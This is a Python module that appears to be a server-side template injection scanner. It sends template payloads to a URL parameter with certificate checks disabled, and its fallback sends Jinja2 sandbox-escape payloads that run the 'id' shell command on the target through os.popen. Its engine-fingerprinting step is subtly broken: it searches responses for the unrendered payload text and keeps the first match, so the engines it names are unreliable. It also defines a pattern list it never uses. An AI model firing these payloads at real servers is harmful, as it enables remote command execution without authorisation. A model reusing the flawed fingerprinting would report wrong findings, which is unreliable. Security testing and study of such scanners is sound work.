import re
from typing import Optional
import requests

SSTI_PATTERNS = [
    r"\{7\d+\}",
    r"\{\{7\*7\}\}",
    r"7\*7\s*=",
    r"49",
]

SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    ("*{7*7}", "49"),
    ("{{7*'7'}}", "7777777"),
    ("<%= 7*7 %>", "49"),
    ("${{7*7}}", "49"),
    ("{{config}}", "config"),
    ("{{self}}", "<"),
    ("${7*7}", "49"),
]

TEMPLATE_ENGINE_FINGERPRINTS = {
    "jinja2": [r"\{\{7\*7\}\}",
               r"\{%\s*if\s*1\s*%\}true\{%\s*endif\s*%\}"],
    "twig": [r"\{\{7\*7\}\}", r"\$\{7\*7\}"],
    "freemarker": [r"\$\{7\*7\}"],
    "velocity": [r"\$\{7\*7\}"],
    "smarty": [r"\{7\*7\}"],
    "handlebars": [r"\{\{7\*7\}\}"],
    "mustache": [r"\{\{7\*7\}\}"],
    "mako": [r"\$\{7\*7\}"],
    "tornado": [r"\{\{7\*7\}\}"],
    "django": [r"\{\{7\*7\}\}"],
    "angular": [r"\{\{7\*7\}\}"],
}


def check(url: str, param: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0) -> dict:
    if sess is None:
        sess = requests.Session()
    result = {"vulnerable": False, "engine": None, "evidence": [], "payload": None}

    for payload, indicator in SSTI_PAYLOADS:
        try:
            sep = "&" if "?" in url else "?"
            r = sess.get("%s%s%s=%s" % (url, sep, param, payload),
                         timeout=timeout, verify=False)
            if indicator in r.text:
                result["vulnerable"] = True
                result["evidence"].append("ssti: %s => %s" % (payload[:20], indicator))
                result["payload"] = payload
                for engine, patterns in TEMPLATE_ENGINE_FINGERPRINTS.items():
                    for pat in patterns:
                        if re.search(pat, r.text):
                            result["engine"] = engine
                            break
                break
        except:
            pass

    if not result["vulnerable"]:
        blind_payloads = [
            ("{{ cycler.__init__.__globals__.os.popen('id').read() }}", "uid="),
            ("{{ lipsum.__globals__.os.popen('id').read() }}", "uid="),
            ("${7*7}", "49"),
        ]
        for payload, indicator in blind_payloads:
            try:
                sep = "&" if "?" in url else "?"
                r = sess.get("%s%s%s=%s" % (url, sep, param, payload),
                             timeout=timeout, verify=False)
                if indicator in r.text:
                    result["vulnerable"] = True
                    result["evidence"].append("ssti: %s" % payload[:30])
                    result["payload"] = payload
                    break
            except:
                pass

    return result
